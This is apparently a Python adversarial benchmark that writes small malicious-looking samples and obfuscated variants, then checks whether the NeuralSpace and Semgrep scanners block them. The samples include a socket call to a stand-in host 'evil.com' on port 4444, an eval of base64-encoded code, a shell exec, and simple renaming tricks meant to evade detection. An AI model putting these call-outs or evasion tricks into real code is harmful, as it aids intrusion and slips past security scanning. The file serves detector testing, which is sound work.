# adversarial_test.py
import os
import json
import subprocess
import sys
import random
from pathlib import Path

# ======================================================================
# HELPER: Run subprocess with proper encoding
# ======================================================================
def run_cmd(cmd, timeout=30):
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout,
            encoding='utf-8',
            errors='replace'
        )
        return result
    except subprocess.TimeoutExpired:
        return None

# ======================================================================
# OBFUSCATION FUNCTIONS
# ======================================================================

def obfuscate_js(code):
    """Apply common JavaScript obfuscations."""
    code = code.replace("base64", "b64")
    code = code.replace("code", "payload")
    code = code.replace("eval(", "globalThis['eval'](")
    code = code.replace('require("base64-js")', 'require(("base64-js"))')
    return code

def obfuscate_go(code):
    """Apply common Go obfuscations."""
    code = code.replace('import "syscall"', 'import s "syscall"')
    code = code.replace('syscall.Exec', 's.Exec')
    return code

def obfuscate_py(code):
    """Apply common Python obfuscations."""
    code = code.replace('import os', 'os = __import__("os")')
    code = code.replace('exec("import socket; socket.socket().connect((\\"evil.com\\", 4444))")',
                        'exec("import socket; " + "socket.socket().connect((\\"evil.com\\", 4444))")')
    code = code.replace('exec(', 'getattr(__builtins__, "exec")(')
    return code

# ======================================================================
# GENERATE ADVERSARIAL VARIANTS
# ======================================================================

BASE_SAMPLES = {
    "mal_4.js": 'const base64 = require("base64-js");\nconst code = "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oImNhbGMuZXhlIik=";\neval(Buffer.from(code, "base64").toString());',
    "mal_6.go": 'package main\nimport "syscall"\nfunc main() { syscall.Exec("/bin/sh", []string{"sh", "-c", "echo malicious"}, nil) }',
    "mal_1.py": 'import os\nexec("import socket; socket.socket().connect((\\"evil.com\\", 4444))")',
}

def generate_adversarial_variants(base_samples, output_dir="adversarial_dataset"):
    os.makedirs(output_dir, exist_ok=True)
    variants = []
    
    for filename, content in base_samples.items():
        ext = Path(filename).suffix.lower()
        base_name = Path(filename).stem
        
        orig_path = os.path.join(output_dir, f"{base_name}_original{ext}")
        with open(orig_path, "w", encoding='utf-8') as f:
            f.write(content)
        variants.append(orig_path)
        
        if ext == '.js':
            obf_content = obfuscate_js(content)
        elif ext == '.go':
            obf_content = obfuscate_go(content)
        elif ext == '.py':
            obf_content = obfuscate_py(content)
        else:
            continue
        
        obf_path = os.path.join(output_dir, f"{base_name}_obfuscated{ext}")
        with open(obf_path, "w", encoding='utf-8') as f:
            f.write(obf_content)
        variants.append(obf_path)
    
    print(f"[*] Generated {len(variants)} adversarial variants in {output_dir}/")
    return variants

# ======================================================================
# SCAN FUNCTIONS (with proper encoding)
# ======================================================================

def scan_with_neuralspace(file_path):
    result = run_cmd(["neuralspace", "scan", str(file_path), "--quarantine", "rename"])
    if result and "BLOCKED" in result.stdout:
        return "BLOCKED"
    return "ALLOWED"

def scan_with_semgrep(file_path):
    result = run_cmd(["semgrep", "--json", "--config", "auto", str(file_path)], timeout=60)
    if not result:
        return "ERROR"
    try:
        data = json.loads(result.stdout)
        if data.get("results"):
            return "BLOCKED"
    except:
        pass
    return "ALLOWED"

# ======================================================================
# RUN ADVERSARIAL BENCHMARK
# ======================================================================

def run_adversarial_benchmark(variants):
    print("\n" + "="*70)
    print("🧠 ADVERSARIAL ROBUSTNESS TEST")
    print("="*70)
    print(f"{'File':40} | {'NeuralSpace':12} | {'Semgrep':10}")
    print("-"*70)
    
    results = []
    for variant in variants:
        ns_result = scan_with_neuralspace(variant)
        sg_result = scan_with_semgrep(variant)
        results.append((Path(variant).name, ns_result, sg_result))
        print(f"{Path(variant).name:40} | {ns_result:12} | {sg_result:10}")
    
    print("-"*70)
    ns_blocked = sum(1 for _, ns, _ in results if ns == "BLOCKED")
    sg_blocked = sum(1 for _, _, sg in results if sg == "BLOCKED")
    total = len(results)
    print(f"📊 NeuralSpace blocked {ns_blocked}/{total} ({ns_blocked/total*100:.1f}%)")
    print(f"📊 Semgrep blocked {sg_blocked}/{total} ({sg_blocked/total*100:.1f}%)")
    print("="*70)

# ======================================================================
# MAIN
# ======================================================================

if __name__ == "__main__":
    variants = generate_adversarial_variants(BASE_SAMPLES)
    run_adversarial_benchmark(variants)